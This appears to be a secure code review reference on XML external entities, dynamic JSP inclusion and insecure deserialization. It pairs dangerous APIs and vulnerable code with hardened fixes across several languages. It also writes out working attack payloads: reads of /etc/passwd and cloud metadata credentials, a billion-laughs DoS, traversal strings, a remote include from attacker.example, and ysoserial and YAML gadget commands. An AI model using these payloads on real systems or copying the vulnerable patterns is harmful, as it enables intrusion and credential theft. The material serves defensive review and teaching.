---
title: "4.3 Code Reference — Review Parsers and Unsafe Reconstitution"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Parsers and Unsafe Reconstitution.
---

# 4.3 Code Reference — Review Parsers and Unsafe Reconstitution

## XXE {: #xxe }

From former `4-09-review-xxe.md`. **Guiding chapter section:** [4.3 - Review Parsers and Unsafe Reconstitution § XXE](../../4-03-review-parsers-and-unsafe-reconstitution.md#xxe).

# 4.9 Code Reference — Review XXE

## Attack Payloads

Use these in authorized tests when the application parses attacker-controlled XML. Confirm parser hardening before relying on file read or SSRF outcomes.

### Pattern 1: Classic external entity file read

```xml
<?xml version="1.0"?>
<!DOCTYPE saml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion>&xxe;</saml:Assertion>
```

### Pattern 2: Parameter entity (blind / filtered contexts)

```xml
<!DOCTYPE response [
  <!ENTITY % ext SYSTEM "file:///var/www/app/config/database.yml">
  %ext;
]>
<soap:Envelope></soap:Envelope>
```

### Pattern 3: SSRF via external entity URL

```xml
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<rss>&xxe;</rss>
```

### Pattern 4: Billion laughs (DoS)

```xml
<!DOCTYPE invoice [
  <!ENTITY a "x">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<Invoice>&c;</Invoice>
```

### Pattern 5: XInclude file read

```xml
<config xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///app/secrets/api-keys.xml"/>
</config>
```

### Pattern 6: UTF-7 / encoding bypass (legacy parsers)

```xml
+ADw-!DOCTYPE saml +AFs-+AD4-
+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
```

## Language-Specific Sinks and Dangerous APIs

Search for XML parser construction without secure feature flags. Default factory settings often enable DTDs and external entities.

### Python

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)
etree.parse(user_file)  # lxml defaults may resolve entities

import xml.etree.ElementTree as ET
ET.parse(upload)  # stdlib — review defusedxml usage

from defusedxml import ElementTree as SafeET
SafeET.parse(upload)  # preferred — verify project uses this
```

### Java

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(inputStream);

SAXParserFactory spf = SAXParserFactory.newInstance();
spf.newSAXParser().parse(inputStream, handler);

XMLInputFactory xif = XMLInputFactory.newFactory();
xif.createXMLStreamReader(reader);
```

### C#

```csharp
var doc = new XmlDocument();
doc.LoadXml(userXml);  // XmlDocument resolves entities by default

var reader = XmlReader.Create(stream);  // without DtdProcessing.Prohibit
```

### JavaScript (Node.js)

```javascript
const libxml = require('libxmljs2');
libxml.parseXml(userXml);  // noent:true enables entities

const { DOMParser } = require('@xmldom/xmldom');
new DOMParser().parseFromString(userXml, 'text/xml');
```

### Go

```go
xml.Unmarshal(userBytes, &v)  // encoding/xml — review Decoder settings
decoder := xml.NewDecoder(bytes.NewReader(userBytes))
decoder.Strict = false
```

### C (libxml2)

```c
xmlReadMemory(buf, size, NULL, NULL, 0);  // default may fetch external entities
xmlCtxtReadDoc(ctxt, buf, NULL, NULL, XML_PARSE_DTDLOAD);
```

## Vulnerable Examples in Other Languages

### Java

```java
public Document parseSamlAssertion(InputStream in) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // defaults: external entities may be enabled depending on JDK/parser
    DocumentBuilder builder = dbf.newDocumentBuilder();
    return builder.parse(in);
}

public void parseSoapEnvelope(InputStream xml, InputStream xsl) throws Exception {
    TransformerFactory tf = TransformerFactory.newInstance();
    Transformer t = tf.newTransformer(new StreamSource(xsl));
    t.transform(new StreamSource(xml), new StreamResult(System.out));
}
```

### C#

```csharp
public XmlDocument ParseSamlResponse(string xml)
{
    var doc = new XmlDocument();
    doc.XmlResolver = new XmlUrlResolver(); // resolves external entities
    doc.LoadXml(xml);
    return doc;
}

public XDocument ParseRssFeed(Stream stream)
{
    return XDocument.Load(stream); // default settings may fetch external DTDs
}
```

### Go

```go
func parseSoapEnvelope(body []byte) error {
    // Third-party XML libs may expand entities if misconfigured
    doc, err := libxml.Parse(body, libxml.DefaultParserOptions)
    return err
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use defusedxml or hardened lxml settings. Disable entity resolution and network access.

```python
from defusedxml import ElementTree as ET

def parse_saml_assertion(data: bytes):
    return ET.fromstring(data)
```

```python
from lxml import etree

def parse_saml_hardened(data: bytes):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
    )
    return etree.fromstring(data, parser)
```

**Important:** Standard library `xml.etree.ElementTree` is safer than misconfigured lxml but defusedxml is the recommended drop-in for untrusted XML.

### Java

Disable DTDs and external entities on `DocumentBuilderFactory`.

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder builder = dbf.newDocumentBuilder();
return builder.parse(in);
```

**Important:** Partial hardening that disables only external entities while DTDs remain allowed is insufficient when DTDs are not required. Prefer `disallow-doctype-decl`.

### C#

Use `XmlReaderSettings` with DTD processing prohibited.

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
var doc = XDocument.Load(reader);
```

```csharp
// Legacy XmlDocument — avoid on untrusted input; if required:
var doc = new XmlDocument { XmlResolver = null };
using var reader = XmlReader.Create(stream, settings);
doc.Load(reader);
```

**Important:** Do not call `XDocument.Load(string)` or `XDocument.Load(stream)` on untrusted input without secure `XmlReader` settings.

### Go

Default `encoding/xml` does not resolve external entities. Audit third-party CGo bindings.

```go
import "encoding/xml"

func parseSamlAssertion(body []byte) (Assertion, error) {
    var env Assertion
    if bytes.Contains(body, []byte("<!DOCTYPE")) ||
       bytes.Contains(body, []byte("<!ENTITY")) {
        return env, errors.New("DOCTYPE/ENTITY not allowed")
    }
    err := xml.Unmarshal(body, &env)
    return env, err
}
```

**Important:** Reject documents containing `<!DOCTYPE` or `<!ENTITY` before third-party parsing when policy requires zero DTD support.

## Dynamic JSP inclusion {: #jsp-include }

From former `4-08-review-dynamic-jsp-inclusion.md`. **Guiding chapter section:** [4.3 - Review Parsers and Unsafe Reconstitution § Dynamic JSP inclusion](../../4-03-review-parsers-and-unsafe-reconstitution.md#jsp-include).

# 4.8 Code Reference — Review Dynamic JSP Inclusion

## Attack Payloads

Use these in authorized tests when a parameter selects which page or fragment is included. Replace `PARAM` with the vulnerable query or form field name.

### Pattern 1: Directory traversal via include path

```text
TAB=../../../WEB-INF/spring-security.xml
TAB=....//....//etc/passwd
TAB=..%2f..%2f..%2fWEB-INF%2fbeans.xml
```

### Pattern 2: Absolute path under web root

```text
TAB=/admin/reports.jsp
TAB=/WEB-INF/applicationContext.xml
TAB=/META-INF/context.xml
```

### Pattern 3: Alternate extension and backup files

```text
TAB=sidebar.jsp.bak
TAB=datasource.properties
TAB=../../application-prod.yml
```

### Pattern 4: Null byte and encoding tricks (legacy parsers)

```text
TAB=chart.jsp%00
TAB=..%252f..%252fadmin%252fusers
TAB=..%c0%af..%c0%afetc/passwd
```

### Pattern 5: Remote / SSRF-style include (when url= is supported)

```text
TAB=https://attacker.example/malicious.jsp
url=file:///etc/shadow
url=http://169.254.169.254/latest/meta-data/
```

### Pattern 6: Framework view-name injection

```text
TAB=redirect:/admin/billing
TAB=..\\..\\windows\\system32\\drivers\\etc\\hosts
view=reports/../secrets
```

## Language-Specific Sinks and Dangerous APIs

Search for include directives and dynamic view resolution. Any path built from request parameters without an allowlist is a review priority.

### Java (JSP / JSTL)

```jsp
<jsp:include page="${param.page}"/>
<c:import url="${param.fragment}"/>
<%@ include file="<%= request.getParameter("tpl") %>" %>
RequestDispatcher rd = req.getRequestDispatcher(userPage); rd.include(req, resp);
```

### Java (Spring MVC)

```java
return userViewName;  // from request parameter
ModelAndView mv = new ModelAndView(request.getParameter("view"));
return "redirect:" + userPath;
```

### Python (Flask / Jinja2)

```python
return render_template(f"partials/{fragment}.html")
return render_template(request.args.get("page"))
app.jinja_env.get_template(user_path).render()
```

### C# (ASP.NET / Razor)

```csharp
return PartialView(userSelectedPartial);
@Html.Partial(Model.FragmentName)
@await Html.PartialAsync(Request.Query["view"])
```

### JavaScript (server-side rendering)

```javascript
res.render(req.query.template, data);
ejs.renderFile(`views/${req.params.page}.ejs`, data);
```

### Go

```go
tmpl := template.Must(template.ParseFiles("templates/" + r.URL.Query().Get("page")))
http.ServeFile(w, r, filepath.Join("views", userFragment))
```

## Vulnerable Examples in Other Languages

### Java

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<jsp:include page="dashboard/${param.tab}.jsp"/>
```

```java
@GetMapping("/dashboard/panel")
public String panel(@RequestParam String tab, Model model) {
    model.addAttribute("metrics", loadMetrics());
    return "dashboard/" + tab; // user supplies ../admin/billing
}
```

### C#

```csharp
public IActionResult LoadDashboardTab(string tab)
{
    return PartialView($"~/Views/Dashboard/{tab}.cshtml");
}

public IActionResult Analytics(string chart)
{
    return View($"Analytics/{chart}"); // chart = "../../Web.config"
}
```

### HTML

```jsp
<%-- Dynamic include driven by request parameter --%>
<%@ include file="<%= request.getParameter("page") %>" %>

<%-- JSP include with user-controlled path segment --%>
<jsp:include page="/partials/${param.partial}.jsp"/>
```

```html
<!-- SSI-style server include (when enabled) -->
<!--#include virtual="/partials/" + param('page') + ".html" -->
```

## Fix: Safer Patterns and Libraries to Use

### Python

Map known keys to fixed template paths. Never pass raw user path segments to `render_template`.

```python
DASHBOARD_TABS = {
    "overview": "dashboard/overview.html",
    "billing": "dashboard/billing.html",
    "usage": "dashboard/usage.html",
}

@app.route("/dashboard/panel")
def dashboard_panel():
    key = request.args.get("tab", "overview")
    template_name = DASHBOARD_TABS.get(key)
    if template_name is None:
        return "Unknown tab", 400
    return render_template(template_name)
```

```python
from werkzeug.security import safe_join

@app.route("/asset")
def asset():
    name = request.args.get("file", "")
    path = safe_join("/var/www/static/partials", name)
    if path is None:
        return "Invalid path", 400
    return send_from_directory("/var/www/static/partials", os.path.basename(path))
```

**Important:** `safe_join` rejects paths that escape the base directory. Combine with allowlists for defense in depth.

### Java

Map known keys to fixed JSP paths. Never return raw user strings as view names.

```java
private static final Map<String, String> DASHBOARD_TABS = Map.of(
    "overview", "dashboard/overview",
    "billing", "dashboard/billing",
    "usage", "dashboard/usage"
);

@GetMapping("/dashboard/panel")
public String panel(@RequestParam String tab, Model model) {
    String viewName = DASHBOARD_TABS.get(tab);
    if (viewName == null) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
    }
    model.addAttribute("metrics", loadMetrics());
    return viewName;
}
```

```java
Path base = Path.of("/app/views").toAbsolutePath().normalize();
Path resolved = base.resolve(name).normalize();
if (!resolved.startsWith(base)) {
    throw new SecurityException("path traversal");
}
```

**Important:** Spring `InternalResourceViewResolver` must receive enum or constant view names only, not request parameters.

### C#

Use enum-driven partials instead of string view names from the client.

```csharp
public enum DashboardTab { Overview, Billing, Usage }

public IActionResult LoadTab(DashboardTab tab)
{
    var viewName = tab switch
    {
        DashboardTab.Overview => "_Overview",
        DashboardTab.Billing => "_Billing",
        DashboardTab.Usage => "_Usage",
        _ => throw new ArgumentOutOfRangeException(nameof(tab))
    };
    return PartialView(viewName);
}
```

```csharp
var fullPath = Path.GetFullPath(Path.Combine(_viewsRoot, name));
if (!fullPath.StartsWith(_viewsRoot, StringComparison.Ordinal))
    return BadRequest();
```

**Important:** Precompiled Razor views must not compile arbitrary `.cshtml` paths from user input at runtime.

### Go

Parse templates at startup from a fixed set. Allowlist lookup for runtime selection.

```go
//go:embed templates/dashboard/*
var dashboardFS embed.FS

var dashboardTemplates = template.Must(
    template.ParseFS(dashboardFS, "templates/dashboard/*.html"))

var dashboardTabs = map[string]string{
    "overview": "overview.html",
    "billing":  "billing.html",
    "usage":    "usage.html",
}

func renderDashboardTab(w http.ResponseWriter, r *http.Request) {
    key := r.URL.Query().Get("tab")
    file, ok := dashboardTabs[key]
    if !ok {
        http.Error(w, "unknown tab", http.StatusBadRequest)
        return
    }
    dashboardTemplates.ExecuteTemplate(w, file, nil)
}
```

**Important:** Avoid `http.ServeFile` and `ParseFiles` with user-influenced paths per request.

## Insecure deserialization {: #deserialization }

From former `4-38-review-insecure-deserialization.md`. **Guiding chapter section:** [4.3 - Review Parsers and Unsafe Reconstitution § Insecure deserialization](../../4-03-review-parsers-and-unsafe-reconstitution.md#deserialization).

# 4.38 Code Reference — Review Insecure Deserialization

## Attack Payloads

Use crafted payloads only in isolated lab environments with authorization. Binary gadget chains vary by classpath and library versions.

### Pattern 1: Python pickle opcode injection

Pickle opcodes can invoke `os.system`, `eval`, or arbitrary callables during `pickle.loads`. Tools such as `pickle-assemble` generate test blobs—never paste untrusted pickle bytes into production parsers.

### Pattern 2: Java ysoserial gadget chains

```text
# Common gadget-bearing libraries on classpath:
# commons-collections, commons-beanutils, spring, groovy
# Generate with ysoserial for authorized pentest:
java -jar ysoserial.jar CommonsCollections6 'id' | base64
```

### Pattern 3: Jackson default typing

```json
["com.example.Evil", {"cmd": "id"}]
{"@class": "java.lang.ProcessBuilder", "command": ["id"]}
```

### Pattern 4: YAML type tags (Python)

```yaml
!!python/object/apply:os.system ["id"]
!!python/object/new:subprocess.check_output [["id"]]
```

### Pattern 5: .NET TypeNameHandling

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": { "$type": "System.Diagnostics.Process, System" }
}
```

### Pattern 6: Ruby Marshal load from cache

```ruby
# Redis session blob — attacker replaces value with crafted Marshal stream
session = Marshal.load(redis.get("sess:#{sid}"))
```

### Pattern 7: PHP phar deserialization

```php
// phar:// wrapper triggers metadata deserialization on file_exists()
file_exists('phar://uploads/evil.phar/b.txt');
```

## Language-Specific Sinks and Dangerous APIs

### Python

```python
pickle.loads(data)
pickle.load(file)
yaml.load(data)  # Loader=yaml.Loader or unsafe default
yaml.unsafe_load(data)
marshal.loads(data)
shelve.open(user_path)
jsonpickle.decode(data)
```

Also review: `torch.load`, `numpy.load(..., allow_pickle=True)`, `dill.loads`, Redis/cache storing pickled objects.

### Java

```java
ObjectInputStream.readObject()
ObjectInputStream.readUnshared()
XMLDecoder.readObject()
XStream.fromXML(userXml);
new ObjectMapper().enableDefaultTyping(...);
JSON.parseObject(json, Object.class);  // Fastjson autoType
Serializable.readObject in RMI/JMX endpoints
```

MyBatis, Hibernate, and Spring remoting with Java serialization on the wire.

### C#

```csharp
BinaryFormatter.Deserialize(stream);
SoapFormatter.Deserialize(stream);
LosFormatter.Deserialize(...);
JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
});
DataContractSerializer with known types expanded from user input
```

### JavaScript

```javascript
node-serialize.unserialize(userInput);
// eval(JSON.parse) patterns that revive functions
require('serialize-javascript') with untrusted revive
```

### Go

```go
gob.NewDecoder(r).Decode(&v)  // from untrusted client
encoding/gob on network input without schema
json.Unmarshal into map[string]interface{} then type assertions on @type fields
```

### PHP

```php
unserialize($_COOKIE['session']);
unserialize(file_get_contents('php://input'));
```

## Vulnerable Examples in Other Languages

### Java

```java
public User loadSession(byte[] blob) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(blob));
    return (User) ois.readObject(); // attacker-controlled bytes
}

public Object importState(InputStream body) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(body);
    return ois.readObject();
}

// Jackson default typing on untrusted JSON
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
User user = mapper.readValue(jsonFromClient, User.class);
```

### C#

```csharp
public object LoadCache(string base64)
{
    var bytes = Convert.FromBase64String(base64);
    var formatter = new BinaryFormatter();
    using var ms = new MemoryStream(bytes);
    return formatter.Deserialize(ms);
}

public T DeserializeJson<T>(string json)
{
    return JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings
    {
        TypeNameHandling = TypeNameHandling.All // polymorphic gadget risk
    });
}
```

### Go

```go
// Accepting gob from clients without schema validation
func decodeProfile(r io.Reader) (*Profile, error) {
    dec := gob.NewDecoder(r)
    var p Profile
    return &p, dec.Decode(&p)
}

func restoreSession(cookie string) (map[string]interface{}, error) {
    data, _ := base64.StdEncoding.DecodeString(cookie)
    var state map[string]interface{}
    return state, json.Unmarshal(data, &state) // no signature or type allowlist
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Parse JSON with schema validation. Never unpickle untrusted bytes.

```python
import json
from pydantic import BaseModel, ValidationError

class ImportState(BaseModel):
    version: int
    items: list[str]

@app.route("/import", methods=["POST"])
def import_state():
    try:
        data = json.loads(request.get_data())
        state = ImportState.model_validate(data)
    except (json.JSONDecodeError, ValidationError):
        abort(400)
    return process(state)

@app.route("/config", methods=["POST"])
def load_config():
    config = yaml.safe_load(request.get_data())
    apply_config(config)
```

Store session state server-side with opaque IDs instead of pickled cookies. See [yaml.safe_load](https://pyyaml.org/wiki/PyYAMLDocumentation#loading-yaml) and [pydantic](https://docs.pydantic.dev/latest/).

### Java

Map JSON to explicit DTOs. Disable default typing. Use ObjectInputFilter when legacy serialization cannot be removed.

```java
import com.google.gson.Gson;
import com.google.gson.JsonSyntaxException;

public User parseUser(String jsonInput) {
    Gson gson = new Gson();
    try {
        return gson.fromJson(jsonInput, User.class);
    } catch (JsonSyntaxException e) {
        throw new IllegalArgumentException("Invalid JSON input");
    }
}
```

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.User;!*");
ois.setObjectInputFilter(filter);
```

See [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290) and [Gson user guide](https://google.github.io/gson/UserGuide.html).

### C#

Deserialize into known types with System.Text.Json. Avoid BinaryFormatter.

```csharp
public ImportState LoadState(string json)
{
    return JsonSerializer.Deserialize<ImportState>(json, new JsonSerializerOptions
    {
        PropertyNameCaseInsensitive = false,
        AllowTrailingCommas = false
    }) ?? throw new JsonException("Invalid payload");
}
```

In Newtonsoft.Json, set `TypeNameHandling = TypeNameHandling.None` on external input. See [System.Text.Json overview](https://learn.microsoft.com/en-us/dotnet/standard/serialization/system-text-json/overview).

### Go

Unmarshal JSON into structs with unknown field rejection and size limits.

```go
func decodeProfile(r io.Reader) (*Profile, error) {
    dec := json.NewDecoder(io.LimitReader(r, 1<<20))
    dec.DisallowUnknownFields()
    var p Profile
    if err := dec.Decode(&p); err != nil {
        return nil, err
    }
    return &p, nil
}
```

Prefer [protobuf](https://protobuf.dev/) or [msgpack](https://msgpack.org/) with explicit message types instead of gob from clients.

